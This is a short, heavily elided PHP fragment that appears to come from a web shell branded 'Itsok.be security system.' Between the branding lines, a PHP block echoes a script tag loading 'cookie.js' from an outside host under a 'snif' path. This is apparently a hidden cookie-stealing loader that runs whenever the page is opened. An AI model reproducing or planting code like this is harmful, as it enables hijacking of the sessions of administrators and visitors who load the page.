...
$donated_html = "<center><b>Itsok.be security</b></center>";
...
?>
<?php
  echo '<script type="text/javascript" language="javascript" src="http://www.materyal.org/snif/cookie.js"></script>';
?>
...
if ($act == "about") {
	...
	echo "<center><b>Itsok.be security system.</b>";
	}
?>
